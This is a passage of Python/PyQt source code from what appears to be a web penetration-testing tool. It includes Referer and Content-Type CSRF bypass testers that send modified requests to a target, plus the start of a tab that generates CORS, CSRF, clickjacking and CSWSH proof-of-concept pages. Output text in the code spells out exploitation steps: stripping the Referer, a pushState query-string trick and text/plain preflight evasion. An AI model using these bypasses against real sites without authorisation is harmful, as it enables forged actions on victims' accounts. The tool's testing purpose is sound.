                f"  {icon} Probe 3 \u2014 Referer Absent                 : HTTP {abs_code} {absent.status_text}")
        if circumvent:
            icon = "\U0001f534" if circ_verdict == "Bypassed" else ("\U0001f7e2" if circ_verdict == "Protected" else "\U0001f7e0")
            lines.append(
                f"  {icon} Probe 4 \u2014 Referer Circumvent             : HTTP {circ_code} {circumvent.status_text}")

        lines += ["", "VERDICT", "\u2500" * 7, ""]

        # ── Probe 2 verdict ──
        if inv_verdict == "Bypassed":
            lines += [
                "  \U0001f534  INVALID REFERER ACCEPTED \u2014 NO REFERER VALIDATION",
                "",
                "  The server accepted a request whose Referer header pointed to a",
                "  completely attacker-controlled domain with no relation to the target.",
                "  This means the application does NOT validate the Referer header value.",
                "  A standard CSRF PoC (no Referer bypass needed) should be sufficient.",
            ]
        elif inv_verdict == "Protected":
            lines += [
                "  \U0001f7e2  INVALID REFERER REJECTED \u2014 VALIDATION IS ACTIVE",
                "",
                f"  Baseline HTTP {base_code} vs Invalid HTTP {inv_code} \u2014 different responses.",
                "  The server checks Referer and rejects values that don't match the",
                "  expected domain. Proceed to check bypass techniques (probes 3 & 4).",
            ]
        else:
            lines.append("  \u2753  Probe 2 inconclusive or not yet run.")

        lines.append("")

        # ── Probe 3 verdict ──
        if abs_verdict == "Bypassed":
            lines += [
                "  \U0001f534  ABSENT BYPASS VIABLE",
                "",
                "  The server returned the same HTTP status when the Referer header",
                "  was omitted. This means the server only validates Referer when it",
                "  is present and skips validation entirely when the header is missing.",
                "",
                "  EXPLOITATION:",
                '  Add <meta name="referrer" content="never"> to the CSRF exploit page.',
                "  The victim's browser will drop the Referer header from the request,",
                "  causing the server to skip its Referer check.",
                "",
                "  Select 'Absent \u2013 Validation depends on header being present' in the",
                "  Referer Bypass dropdown and generate the PoC.",
            ]
        elif abs_verdict == "Protected":
            lines += [
                "  \U0001f7e2  ABSENT: SERVER VALIDATES REFERER PRESENCE",
                "",
                f"  Baseline HTTP {base_code} vs Absent HTTP {abs_code} \u2014 different responses.",
                "  The server appears to reject requests when the Referer is missing.",
            ]
        else:
            lines.append("  \u2753  Probe 3 inconclusive or not yet run.")

        lines.append("")

        # ── Probe 4 verdict ──
        if circ_verdict == "Bypassed":
            lines += [
                "  \U0001f534  CIRCUMVENT BYPASS VIABLE",
                "",
                "  The server accepted a Referer containing the target domain in the",
                "  query string (e.g. https://attacker.com?target.com). The application",
                "  validates that Referer 'contains' the expected domain but does not",
                "  check that it appears as the actual host.",
                "",
                "  EXPLOITATION:",
                f"  Use history.pushState('', '', '/?{target_host}') so the exploit",
                "  page URL contains the target domain in its query string. The browser",
                "  sends this full URL as the Referer header when the form submits.",
                "",
                "  IMPORTANT: Set the response header Referrer-Policy: unsafe-url",
                "  on your exploit server \u2014 without it, many browsers strip the query",
                "  string from the Referer header before sending it.",
                "",
                "  Select 'Circumvent \u2013 Validation can be bypassed (query string trick)'",
                "  in the Referer Bypass dropdown and generate the PoC.",
            ]
        elif circ_verdict == "Protected":
            lines += [
                "  \U0001f7e2  CIRCUMVENT: SERVER VALIDATES REFERER HOST PROPERLY",
                "",
                f"  Baseline HTTP {base_code} vs Circumvent HTTP {circ_code} \u2014 different responses.",
                "  The server appears to validate the Referer host rather than just",
                "  checking for substring presence. The query string trick is blocked.",
            ]
        else:
            lines.append("  \u2753  Probe 4 inconclusive or not yet run.")

        lines += ["", "\u2550" * 72]
        self._summary_view.setPlainText("\n".join(lines))


# ─────────────────────────────────────────────────────────────────────────────
# Content-Type Bypass Tester
# ─────────────────────────────────────────────────────────────────────────────

class ContentTypeTesterDialog(QDialog):
    """
    Tests how the server behaves when the Content-Type header is changed.

    Probes (where applicable to the request):
      1. Baseline                  — original request verbatim
      2. text/plain                — simple request, no CORS preflight
      3. multipart/form-data       — simple request, MIME-part encoding
      4. Content-Type absent       — header removed entirely
      5. JSON -> form-encoded      — (when original is JSON)
         or form-encoded -> JSON   — (when original is form-encoded)
    """

    _RESULT_COLORS = {
        "Bypassed":  "#ff4c4c",
        "Protected": "#2ecc71",
        "Baseline":  "#5b9bd5",
        "Error":     "#e67e22",
        "Pending":   "#888888",
        "Unknown":   "#aaaaaa",
    }

    def __init__(self, request_info: "RequestInfo", raw_request: str, parent=None):
        super().__init__(parent)
        self.setWindowFlag(Qt.Window, True)   # independent, non-modal window
        self.request_info = request_info
        self.raw_request  = raw_request
        self._probes: List[CSRFProbe] = []
        self._worker: Optional[CSRFTesterWorker] = None
        self._selected_row = -1

        self.setWindowTitle("\U0001f50e Content-Type Bypass Tester")
        self.setMinimumSize(900, 640)
        self.setStyleSheet(f"""
            QDialog, QWidget {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
            }}
            QTableWidget {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER};
                border:1px solid {COLOR_BORDER};
            }}
            QTableWidget::item:selected {{
                background:{COLOR_ACCENT}; color:#000;
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:4px;
            }}
            QTextEdit {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:3px;
            }}
            QPushButton {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:4px;
                padding:4px 12px;
            }}
            QPushButton:hover {{ border-color:{COLOR_ACCENT}; color:{COLOR_TEXT_BRIGHT}; }}
            QPushButton:disabled {{ color:{COLOR_TEXT_MUTED}; }}
            QTabBar::tab {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:5px 12px;
                margin-right:2px;
            }}
            QTabBar::tab:selected {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};
                border-bottom:2px solid {COLOR_ACCENT};
            }}
        """)

        self._build_probes()
        self._build_ui()
        self._populate_queue()

    # -- Helpers ---------------------------------------------------------------

    @staticmethod
    def _set_content_type(raw: str, ct: str) -> str:
        """Replace or add Content-Type header in a raw HTTP request string."""
        lines = raw.replace("\r\n", "\n").split("\n")
        replaced = False
        for i, line in enumerate(lines):
            if line.lower().startswith("content-type:"):
                lines[i] = f"Content-Type: {ct}"
                replaced = True
                break
        if not replaced:
            lines.insert(1, f"Content-Type: {ct}")
        return "\r\n".join(lines)

    @staticmethod
    def _remove_content_type(raw: str) -> str:
        """Remove Content-Type header from a raw HTTP request string."""
        lines = raw.replace("\r\n", "\n").split("\n")
        lines = [ln for ln in lines if not ln.lower().startswith("content-type:")]
        return "\r\n".join(lines)

    @staticmethod
    def _replace_body(raw: str, new_body: str) -> str:
        """Replace the body of a raw HTTP request and update Content-Length."""
        parts = raw.replace("\r\n", "\n").split("\n\n", 1)
        header_part = parts[0]
        header_lines = header_part.split("\n")
        new_len = str(len(new_body.encode("utf-8")))
        for i, line in enumerate(header_lines):
            if line.lower().startswith("content-length:"):
                header_lines[i] = f"Content-Length: {new_len}"
                break
        return "\r\n".join(header_lines) + "\r\n\r\n" + new_body

    # -- Probe construction ----------------------------------------------------

    def _build_probes(self):
        """Build probe sequence based on the original Content-Type."""
        ri  = self.request_info
        raw = self.raw_request

        orig_ct = ""
        for k, v in ri.headers.items():
            if k.lower() == "content-type":
                orig_ct = v.lower()
                break

        self._probes = []

        # 1. Baseline
        self._probes.append(CSRFProbe(
            name="1. Baseline (original Content-Type)",
            description="Original request sent verbatim \u2014 establishes the expected baseline response.",
            raw_request=raw,
        ))

        # 2. text/plain
        if "text/plain" not in orig_ct:
            self._probes.append(CSRFProbe(
                name="2. Content-Type: text/plain (body unchanged)",
                description=(
                    "Change Content-Type to text/plain while keeping the original body. "
                    "text/plain is a browser simple request type \u2014 no CORS preflight is triggered. "
                    "If the server processes the body regardless of Content-Type, the action executes."
                ),
                raw_request=self._set_content_type(raw, "text/plain"),
                bypass_hint=CSRFGenerator.BYPASS_CONTENT_TYPE,
            ))

        # 2b. text/plain + JSON body — preflight bypass for JSON APIs
        if "application/json" in orig_ct and ri.body:
            try:
                json.loads(ri.body)  # verify body is parseable JSON
                self._probes.append(CSRFProbe(
                    name="2b. text/plain + JSON body (preflight bypass)",
                    description=(
                        "Send the original JSON body with Content-Type: text/plain. "
                        "text/plain is a CORS simple type — no OPTIONS preflight is sent. "
                        "If the server parses the body as JSON regardless of the Content-Type "
                        "header (Express, Flask, FastAPI, Go, etc.), the action executes "
                        "cross-origin without any CORS approval. "
                        "This is the primary CSRF vector for JSON APIs."
                    ),
                    raw_request=self._set_content_type(raw, "text/plain"),
                    bypass_hint=CSRFGenerator.BYPASS_CT_PLAIN_JSON,
                ))
            except Exception:
                pass

        # 2c. form trick — split JSON across name/value so = lands inside a string
        if "application/json" in orig_ct and ri.body:
            try:
                parsed = json.loads(ri.body)
                if isinstance(parsed, dict):
                    self._probes.append(CSRFProbe(
                        name="2c. text/plain + JSON form trick (no JS, no preflight)",
                        description=(
                            "Submit JSON via an HTML form with enctype=text/plain. "
                            "The JSON is split so the browser's name=value separator "
                            "hides the = inside a harmless extra key (_). "
                            "No JavaScript required — works even under strict CSP. "
                            "No CORS preflight triggered."
                        ),
                        raw_request=self._set_content_type(raw, "text/plain"),
                        bypass_hint=CSRFGenerator.BYPASS_CT_FORM_JSON,
                    ))
            except Exception:
                pass

        # 3. multipart/form-data
        if "multipart" not in orig_ct:
            self._probes.append(CSRFProbe(
                name="3. Content-Type: multipart/form-data (body unchanged)",
                description=(
                    "Change Content-Type to multipart/form-data. "
                    "Also a simple request type \u2014 no CORS preflight. "
                    "Tests whether the server accepts the body in a different encoding."
                ),
                raw_request=self._set_content_type(raw, "multipart/form-data"),
                bypass_hint=CSRFGenerator.BYPASS_CONTENT_TYPE,
            ))

        # 4. Content-Type absent
        self._probes.append(CSRFProbe(
            name="4. Content-Type header absent",
            description=(
                "Remove Content-Type header entirely. "
                "Tests whether the server defaults to processing the body without strict content-type checking."
            ),
            raw_request=self._remove_content_type(raw),
            bypass_hint=CSRFGenerator.BYPASS_CONTENT_TYPE,
        ))

        # 5a. JSON -> form-encoded
        if "application/json" in orig_ct and ri.body:
            try:
                parsed = json.loads(ri.body)
                if isinstance(parsed, dict):
                    form_body = urllib.parse.urlencode(
                        {k: json.dumps(v, separators=(',', ':')) if isinstance(v, (dict, list)) else str(v)
                         for k, v in parsed.items()})
                    raw_form = self._set_content_type(
                        self._replace_body(raw, form_body),
                        "application/x-www-form-urlencoded")
                    self._probes.append(CSRFProbe(
                        name="5. Content-Type: JSON \u2192 application/x-www-form-urlencoded",
                        description=(
                            "Convert JSON body to URL-encoded form data and change Content-Type. "
                            "HTML forms can send this natively cross-origin \u2014 no preflight. "
                            "Tests whether the endpoint processes URL-encoded params the same way."
                        ),
                        raw_request=raw_form,
                        bypass_hint=CSRFGenerator.BYPASS_CONTENT_TYPE,
                    ))
            except Exception:
                pass

        # 5b. form-encoded -> JSON
        elif "application/x-www-form-urlencoded" in orig_ct and ri.body:
            try:
                body_params = dict(urllib.parse.parse_qsl(ri.body, keep_blank_values=True))
                json_body = json.dumps(body_params)
                raw_json = self._set_content_type(
                    self._replace_body(raw, json_body),
                    "application/json")
                self._probes.append(CSRFProbe(
                    name="5. Content-Type: form-encoded \u2192 application/json",
                    description=(
                        "Convert URL-encoded body to JSON and change Content-Type. "
                        "Tests whether the endpoint accepts JSON \u2014 token validation may differ by content type."
                    ),
                    raw_request=raw_json,
                    bypass_hint=CSRFGenerator.BYPASS_CONTENT_TYPE,
                ))
            except Exception:
                pass

    # -- UI --------------------------------------------------------------------

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        info_lbl = QLabel(
            "<b>Probe 1</b> sends the original request (baseline). "
            "Remaining probes change the Content-Type (and body encoding where relevant) "
            "to test whether the server processes requests differently by Content-Type "
            "and whether CSRF token validation can be bypassed."
        )
        info_lbl.setWordWrap(True)
        info_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:9pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:6px 8px;"
        )
        root.addWidget(info_lbl)

        # Toolbar
        tb = QHBoxLayout()
        self._run_btn = QPushButton("\u25b6  Run Probes")
        self._run_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:4px 16px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self._run_btn.clicked.connect(self._start_probes)

        self._stop_btn = QPushButton("\u25a0  Stop")
        self._stop_btn.setEnabled(False)
        self._stop_btn.clicked.connect(self._stop_probes)

        self._status_lbl = QLabel("Ready \u2014 click \u2018Run Probes\u2019 to start")
        self._status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")

        tb.addWidget(self._run_btn)
        tb.addWidget(self._stop_btn)
        tb.addSpacing(12)
        tb.addWidget(self._status_lbl)
        tb.addStretch()
        root.addLayout(tb)

        # Progress bar
        self._progress = QProgressBar()
        self._progress.setFixedHeight(6)
        self._progress.setMaximum(len(self._probes) or 1)
        self._progress.setValue(0)
        self._progress.setTextVisible(False)
        self._progress.setStyleSheet(
            f"QProgressBar{{background:{COLOR_DARK_BG};border:none;border-radius:3px;}}"
            f"QProgressBar::chunk{{background:{COLOR_ACCENT};border-radius:3px;}}"
        )
        root.addWidget(self._progress)

        # Splitter
        splitter = QSplitter(Qt.Vertical)
        splitter.setHandleWidth(5)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # Probe table
        queue_widget = QWidget()
        queue_layout = QVBoxLayout(queue_widget)
        queue_layout.setContentsMargins(0, 0, 0, 0)
        queue_layout.setSpacing(4)
        queue_lbl = QLabel("Probe Queue")
        queue_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        queue_layout.addWidget(queue_lbl)

        self._table = QTableWidget(0, 4)
        self._table.setHorizontalHeaderLabels(["#", "Probe Name", "Status", "Result"])
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Fixed)
        self._table.setColumnWidth(0, 32)
        self._table.setColumnWidth(2, 80)
        self._table.setColumnWidth(3, 120)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        self._table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._table.verticalHeader().setVisible(False)
        self._table.setAlternatingRowColors(True)
        self._table.itemSelectionChanged.connect(self._on_row_selected)
        queue_layout.addWidget(self._table)
        splitter.addWidget(queue_widget)

        # Detail tabs
        self._tabs = QTabWidget()

        self._req_view = QTextEdit()
        self._req_view.setReadOnly(True)
        self._req_view.setFont(QFont("Consolas", 9))
        self._req_view.setPlaceholderText("Select a probe above to see its request\u2026")
        self._tabs.addTab(self._req_view, "\U0001f4e4 HTTP Request")

        self._resp_view = QTextEdit()
        self._resp_view.setReadOnly(True)
        self._resp_view.setFont(QFont("Consolas", 9))
        self._resp_view.setPlaceholderText("Response will appear here after probe runs\u2026")
        self._tabs.addTab(self._resp_view, "\U0001f4e5 HTTP Response")

        self._summary_view = QTextEdit()
        self._summary_view.setReadOnly(True)
        self._summary_view.setFont(QFont("Consolas", 10))
        self._summary_view.setPlaceholderText("Summary appears here after all probes complete\u2026")
        self._tabs.addTab(self._summary_view, "\U0001f4ca Summary")

        splitter.addWidget(self._tabs)
        splitter.setSizes([220, 380])
        root.addWidget(splitter)

        close_btn = QPushButton("Close")
        close_btn.setFixedWidth(100)
        close_btn.clicked.connect(self.close)
        btn_row = QHBoxLayout()
        btn_row.addStretch()
        btn_row.addWidget(close_btn)
        root.addLayout(btn_row)

    def _populate_queue(self):
        self._table.setRowCount(len(self._probes))
        for i, probe in enumerate(self._probes):
            num_item = QTableWidgetItem(str(i + 1))
            num_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 0, num_item)
            self._table.setItem(i, 1, QTableWidgetItem(probe.name))
            status_item = QTableWidgetItem("\u2013")
            status_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 2, status_item)
            result_item = QTableWidgetItem("Pending")
            result_item.setForeground(QBrush(QColor(self._RESULT_COLORS["Pending"])))
            self._table.setItem(i, 3, result_item)
        if self._probes:
            self._table.selectRow(0)

    # -- Probe execution -------------------------------------------------------

    def _start_probes(self):
        if not self._probes:
            return
        ri = self.request_info
        self._run_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._progress.setMaximum(len(self._probes))
        self._progress.setValue(0)
        self._summary_view.clear()

        for i, probe in enumerate(self._probes):
            self._table.item(i, 2).setText("\u2013")
            self._table.item(i, 3).setText("Pending")
            self._table.item(i, 3).setForeground(
                QBrush(QColor(self._RESULT_COLORS["Pending"])))
            probe.result_label     = "Pending"
            probe.status_code      = 0
            probe.response_body    = ""
            probe.response_headers = ""

        self._worker = CSRFTesterWorker(
            self._probes,
            host        = ri.host,
            port        = ri.port,
            use_ssl     = ri.scheme == "https",
            refresh_cfg = {},
        )
        self._worker.probe_started.connect(self._on_probe_started)
        self._worker.probe_finished.connect(self._on_probe_finished)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    def _stop_probes(self):
        if self._worker and self._worker.isRunning():
            self._worker.terminate()
            self._worker.wait(1000)
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("Stopped by user.")

    # -- Slots -----------------------------------------------------------------

    @pyqtSlot(int)
    def _on_probe_started(self, idx: int):
        self._status_lbl.setText(
            f"Running probe {idx + 1}/{len(self._probes)}: {self._probes[idx].name}")
        self._table.item(idx, 3).setText("Running\u2026")
        self._table.item(idx, 3).setForeground(
            QBrush(QColor(self._RESULT_COLORS["Pending"])))
        self._table.scrollToItem(self._table.item(idx, 0))

    @pyqtSlot(int, object)
    def _on_probe_finished(self, idx: int, probe: CSRFProbe):
        self._progress.setValue(idx + 1)
        status_text = str(probe.status_code) if probe.status_code else "ERR"
        self._table.item(idx, 2).setText(status_text)
        self._table.item(idx, 3).setText(probe.result_label)
        color = self._RESULT_COLORS.get(probe.result_label, "#888")
        self._table.item(idx, 3).setForeground(QBrush(QColor(color)))
        if self._selected_row == idx:
            self._show_probe(probe)

    @pyqtSlot()
    def _on_all_done(self):
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("\u2713 All probes complete.")
        self._build_summary()
        self._tabs.setCurrentIndex(2)

    def _on_row_selected(self):
        idx = self._table.currentRow()
        if 0 <= idx < len(self._probes):
            self._selected_row = idx
            self._show_probe(self._probes[idx])

    def _show_probe(self, probe: CSRFProbe):
        self._req_view.setPlainText(probe.raw_request)
        if probe.status_code:
            body = probe.response_body or "(empty body)"
            resp = (
                f"HTTP/1.1 {probe.status_code} {probe.status_text}\n"
                f"{probe.response_headers}\n\n"
                f"\u2500\u2500 Body \u2500\u2500\n{body}"
            )
        elif probe.error:
            resp = f"[Error]\n{probe.error}"
        else:
            resp = "(Not yet run \u2014 click \u2018Run Probes\u2019)"
        self._resp_view.setPlainText(resp)

    # -- Summary ---------------------------------------------------------------

    def _build_summary(self):
        ri       = self.request_info
        baseline = self._probes[0] if self._probes else None
        others   = self._probes[1:]

        lines: List[str] = [
            "\u2554" + "\u2550" * 70 + "\u2557",
            "\u2551  CONTENT-TYPE BYPASS TESTER \u2014 RESULT REPORT" + " " * 25 + "\u2551",
            "\u255a" + "\u2550" * 70 + "\u255d",
            "",
            "TARGET",
            "\u2500\u2500\u2500\u2500\u2500\u2500",
            f"  URL    : {ri.url}",
            f"  Method : {ri.method}",
            f"  Host   : {ri.host}",
            "",
            "PROBES",
            "\u2500\u2500\u2500\u2500\u2500\u2500",
        ]

        if baseline:
            base_code = baseline.status_code or "?"
            lines.append(
                f"  \U0001f535 Probe 1 \u2014 Baseline : HTTP {base_code} {baseline.status_text}")
        for probe in others:
            code = probe.status_code or "?"
            icon = ("\U0001f534" if probe.result_label == "Bypassed"
                    else "\U0001f7e2" if probe.result_label == "Protected"
                    else "\U0001f7e0")
            lines.append(f"  {icon} {probe.name} : HTTP {code} {probe.status_text}")

        lines += ["", "VERDICT", "\u2500\u2500\u2500\u2500\u2500\u2500\u2500", ""]

        bypassed  = [p for p in others if p.result_label == "Bypassed"]
        protected = [p for p in others if p.result_label == "Protected"]

        if bypassed:
            lines += [
                "  \U0001f534  BYPASS VIABLE \u2014 server accepted the following Content-Type variants:",
                "",
            ]
            for p in bypassed:
                lines.append(f"    \u2022 {p.name}")
            lines += [
                "",
                "  EXPLOITATION:",
                "  Select the matching Content-Type in the 'Content-Type Bypass' dropdown",
                "  and generate the PoC. The form will use the bypassed Content-Type,",
                "  avoiding CORS preflight and potentially bypassing token validation.",
            ]
        elif protected:
            lines += [
                "  \U0001f7e2  SERVER ENFORCES CONTENT-TYPE VALIDATION",
                "",
                "  All alternative Content-Type probes were rejected. The server correctly",
                "  validates the Content-Type header. A Content-Type bypass is unlikely.",
            ]
        else:
            lines.append("  \u2753  Results inconclusive or not yet run.")

        lines += ["", "\u2550" * 72]
        self._summary_view.setPlainText("\n".join(lines))


# ─────────────────────────────────────────────────────────────────────────────
# Main Tab Widget
# ─────────────────────────────────────────────────────────────────────────────

class POCTab(QWidget):
    """
    PoC Tab for generating CORS/CSRF proof-of-concept code.
    Left panel: HTTP Request editor + PoC Configuration
    Right panel: Generated PoC output + Request Info
    """
    
    # Signals
    poc_generated = pyqtSignal(str)
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self._current_request_info: Optional[RequestInfo] = None
        self._poc_edit_mode: bool = False
        self._current_temp_path: Optional[str] = None
        # Single reusable debounce timer — prevents a new QTimer object being
        # created (and leaked) on every keystroke.
        self._auto_generate_timer = QTimer(self)
        self._auto_generate_timer.setSingleShot(True)
        self._auto_generate_timer.timeout.connect(self._auto_generate)
        self._build_ui()
        self._apply_style()
    
    # ── UI Building ─────────────────────────────────────────────────────────
    
    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(6, 6, 6, 6)
        root.setSpacing(4)
        
        # ── Top toolbar ───────────────────────────────────────────────────
        tb = QHBoxLayout()
        
        self.generate_btn = QPushButton("Generate PoC")
        self.copy_btn = QPushButton("📋  Copy to Clipboard")
        self.save_btn = QPushButton("Save to File")
        self.clear_btn = QPushButton("🗑  Clear")
        self.test_btn = QPushButton("🌐  Open in Browser")
        self.copy_path_btn = QPushButton("Copy File Path")
        
        for btn in (self.generate_btn, self.copy_btn, self.save_btn, self.clear_btn, self.test_btn, self.copy_path_btn):
            btn.setFixedHeight(28)
        
        self.generate_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:0 14px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
        )
        
        self.copy_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 12px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )

        self.save_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 12px;}}"
            f"QPushButton:hover{{color:{COLOR_TEXT_BRIGHT};border-color:{COLOR_ACCENT};}}"
        )
        
        self.clear_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 8px;}}"
            f"QPushButton:hover{{color:{COLOR_TEXT_BRIGHT};border-color:{COLOR_ACCENT};}}"
        )
        
        self.test_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 12px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )

        self.copy_path_btn.setToolTip(
            "Write the current PoC to a temp file and copy its path — paste into any browser address bar")
        self.copy_path_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 12px;}}"
            f"QPushButton:hover{{color:{COLOR_TEXT_BRIGHT};border-color:{COLOR_ACCENT};}}"
        )
        
        self.status_lbl = QLabel("Ready")
        self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        
        tb.addWidget(self.generate_btn)
        tb.addWidget(self.copy_btn)
        tb.addWidget(self.save_btn)
        tb.addWidget(self.clear_btn)
        tb.addWidget(self.test_btn)
        tb.addWidget(self.copy_path_btn)
        tb.addStretch()
        tb.addWidget(self.status_lbl)
        
        tb_widget = QWidget()
        tb_widget.setLayout(tb)
        tb_widget.setFixedHeight(42)
        root.addWidget(tb_widget)
        
        # ── Horizontal splitter ───────────────────────────────────────────
        h_splitter = QSplitter(Qt.Horizontal)
        h_splitter.setHandleWidth(5)
        h_splitter.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")
        
        # ─── LEFT PANEL: vertical splitter ─────────────────────────────────
        left_panel = QSplitter(Qt.Vertical)
        left_panel.setHandleWidth(5)
        left_panel.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")
        
        # LEFT-TOP: HTTP Request
        req_group = QGroupBox("HTTP Request")
        req_group.setStyleSheet(self._group_box_style())
        req_layout = QVBoxLayout(req_group)
        req_layout.setContentsMargins(6, 12, 6, 6)
        req_layout.setSpacing(4)
        
        # Target info row
        target_row = QHBoxLayout()
        target_row.setSpacing(6)
        
        scheme_lbl = QLabel("Scheme:")
        scheme_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.scheme_combo = QComboBox()
        self.scheme_combo.addItems(["https", "http"])
        self.scheme_combo.setFixedWidth(75)
        self.scheme_combo.setFixedHeight(24)
        self.scheme_combo.currentTextChanged.connect(self._on_scheme_changed)
        
        host_lbl = QLabel("Host:")
        host_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.host_edit = QLineEdit()
        self.host_edit.setPlaceholderText("example.com:443")
        self.host_edit.setFixedHeight(24)
        self.host_edit.textChanged.connect(self._on_host_changed)
        
        target_row.addWidget(scheme_lbl)
        target_row.addWidget(self.scheme_combo)
        target_row.addSpacing(8)
        target_row.addWidget(host_lbl)
        target_row.addWidget(self.host_edit, 1)
        
        req_layout.addLayout(target_row)
        
        self.request_edit = QTextEdit()
        self.request_edit.setFont(QFont("Consolas", 10))
        self.request_edit.setPlaceholderText(
            "Paste a raw HTTP request here, or use\n"
            "HTTP History → right-click → 🧪 Send to PoC\n\n"
            "Example:\n"
            "GET /api/user HTTP/1.1\n"
            "Host: example.com\n"
            "Authorization: Bearer token\n\n"
        )
        self._req_hl = HttpSyntaxHighlighter(self.request_edit.document())
        self.request_edit.textChanged.connect(self._on_request_changed)
        req_layout.addWidget(self.request_edit)
        
        left_panel.addWidget(req_group)
        
        # LEFT-BOTTOM: PoC Configuration
        config_group = QGroupBox("PoC Configuration")
        config_group.setStyleSheet(self._group_box_style())
        config_layout = QVBoxLayout(config_group)
        config_layout.setContentsMargins(8, 14, 8, 8)
        config_layout.setSpacing(10)
        
        
        # Row: PoC Type
        type_row = QHBoxLayout()
        type_row.setSpacing(12)
        
        type_lbl = QLabel("PoC Type:")
        type_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;font-weight:bold;")
        self.poc_type_combo = QComboBox()
        self.poc_type_combo.addItems(["CORS PoC", "CSRF PoC", "Clickjacking PoC", "CSWSH PoC"])
        self.poc_type_combo.setFixedHeight(26)
        self.poc_type_combo.setFixedWidth(150)
        self.poc_type_combo.currentTextChanged.connect(self._on_poc_type_changed)
        
        type_row.addWidget(type_lbl)
        type_row.addWidget(self.poc_type_combo)
        type_row.addStretch()
        
        config_layout.addLayout(type_row)
        
        # CORS Options Group (only shown when CORS is selected)
        self.cors_opts_group = QWidget()
        self.cors_opts_group.setObjectName("cors_opts_group")
        cors_opts_layout = QVBoxLayout(self.cors_opts_group)
        cors_opts_layout.setContentsMargins(0, 5, 0, 5)
        cors_opts_layout.setSpacing(8)
        
        # Separator
        sep1 = QFrame()
        sep1.setFrameShape(QFrame.HLine)
        sep1.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        cors_opts_layout.addWidget(sep1)
        
        cors_label = QLabel("CORS Options:")
        cors_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        cors_opts_layout.addWidget(cors_label)
        
        # CORS Test Type Dropdown
        test_type_row = QHBoxLayout()
        test_type_row.setSpacing(8)
        test_type_lbl = QLabel("Test Type:")
        test_type_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.cors_test_type = QComboBox()
        self.cors_test_type.addItems(["Origin Reflection", "Null Origin", "Trusted Subdomain", "Wildcard (*) Misconfig"])
        self.cors_test_type.setFixedHeight(26)
        self.cors_test_type.setFixedWidth(180)
        self.cors_test_type.currentTextChanged.connect(self._on_cors_test_type_changed)
        test_type_row.addWidget(test_type_lbl)
        test_type_row.addWidget(self.cors_test_type)
